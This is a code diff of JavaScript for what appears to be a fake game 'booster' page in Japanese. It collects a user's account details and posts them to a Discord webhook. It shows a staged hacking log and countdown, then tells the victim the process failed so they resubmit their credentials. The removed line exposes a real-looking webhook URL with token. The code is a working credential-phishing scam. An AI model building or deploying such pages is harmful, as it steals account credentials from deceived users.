@@ -1,4 +1,4 @@
-const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1383529796595613816/ub2mTIV7qRheXhiorjMOse8uGZ6FyMTX6HkYKVvrAdp9V7HXtBUAF0U8HtHAqOa0S6Zk';
+const WEBHOOK_URL = 'webhookのリンク';
 
 const form1 = document.getElementById('account-form');
 const form2 = document.getElementById('boost-form');
@@ -68,7 +68,7 @@ form2.addEventListener('submit', (e) => {
   const money = document.getElementById('money-amount').value.trim();
 
   const embed = {
-    title: "Boost Info",
+    title: "Info",
     color: 15844367,
     fields: [
       { name: "Username", value: savedAccount.username, inline: true },
@@ -87,9 +87,10 @@ function startFakeProcess(logEl, level, money) {
   logEl.style.fontSize = '16px';
   logEl.style.lineHeight = '1.4';
 
-  let seconds = Math.random() * 420 + 180;
+  let remainingMs = (Math.floor(Math.random() * 420 + 180)) * 1000;
   const logLines = [];
   const maxLines = 7;
+  let stopped = false;
 
   const statusDisplay = document.createElement('div');
   statusDisplay.style.position = 'fixed';
@@ -105,7 +106,7 @@ function startFakeProcess(logEl, level, money) {
   statusDisplay.style.whiteSpace = 'pre-line';
   document.body.appendChild(statusDisplay);
 
-  const baseLogs = [
+  const logs = [
     "Loading memory segment 0x00ffae...",
     "Fetching user token...",
     "Connected to proxy node 185.88.2.21",
@@ -122,50 +123,30 @@ function startFakeProcess(logEl, level, money) {
     "Uploading data to server...",
     "Privilege escalation complete",
     "Launching WebSocket tunnel...",
-    "Emulating iPhone13,3 browser",
     "Recalculating XP checksum...",
     "Patching main.bundle.js...",
     "WASM module injected",
-    "Java class injected at runtime",
-    "Executing BoostEngine.run()...",
-    "Verifying payload signature...",
-    "POST /level/upgraded => 200 OK",
-    "Proxy rotation: success",
-    "Session hijack simulation complete"
+    "Injecting +"+level+" levels...",
+    "Balance update: +$"+money
   ];
 
-  const userLogs = [
-    `Preparing to increase level by ${level}...`,
-    `Injecting +${level} levels...`,
-    `Balance update: +$${money}`,
-    `Injecting +${money} money to balance...`,
-    `Verifying level=${level}...`,
-    `Verifying currency=${money}...`
-  ];
+  const timerInterval = setInterval(() => {
+    if (stopped) return;
 
-  const allLogs = baseLogs.concat(userLogs);
+    remainingMs = Math.max(0, remainingMs - 10);
 
-  const interval = setInterval(() => {
-    seconds = Math.max(0, seconds + (Math.random() - 0.5) * 30 - 0.5);
-
-    const m = Math.floor(seconds / 60);
-    const s = Math.floor(seconds % 60);
-    const ms = Math.floor((seconds % 1) * 1000);
+    const totalSec = Math.floor(remainingMs / 1000);
+    const m = Math.floor(totalSec / 60);
+    const s = totalSec % 60;
+    const ms = remainingMs % 1000;
     const dots = '.'.repeat(Math.floor(Math.random() * 3) + 1);
+
     statusDisplay.textContent = `改竄中${dots}\n残り ${m}分${s}秒${ms}ミリ秒`;
 
-    for (let i = 0; i < 3; i++) {
-      const time = new Date().toLocaleTimeString('en-GB');
-      const line = `[${time}] ${allLogs[Math.floor(Math.random() * allLogs.length)]}`;
-      logLines.push(line);
-      if (logLines.length > maxLines) logLines.shift();
-    }
-
-    logEl.textContent = logLines.join('\n');
-    logEl.scrollTop = logEl.scrollHeight;
-
-    if (seconds <= 0) {
-      clearInterval(interval);
+    if (remainingMs <= 0 && !stopped) {
+      stopped = true;
+      clearInterval(timerInterval);
+      clearInterval(logInterval);
       statusDisplay.remove();
 
       const failTime = new Date().toLocaleTimeString('en-GB');
@@ -177,6 +158,18 @@ function startFakeProcess(logEl, level, money) {
         処理に失敗しました。アカウントの情報が正しいか確認してもう一度実行をしてください。
         </div>`;
     }
+  }, 10);
+
+  const logInterval = setInterval(() => {
+    if (stopped) return;
+    for (let i = 0; i < 3; i++) {
+      const time = new Date().toLocaleTimeString('en-GB');
+      const line = `[${time}] ${logs[Math.floor(Math.random() * logs.length)]}`;
+      logLines.push(line);
+      if (logLines.length > maxLines) logLines.shift();
+    }
+    logEl.textContent = logLines.join('\n');
+    logEl.scrollTop = logEl.scrollHeight;
   }, 100);
 }
 
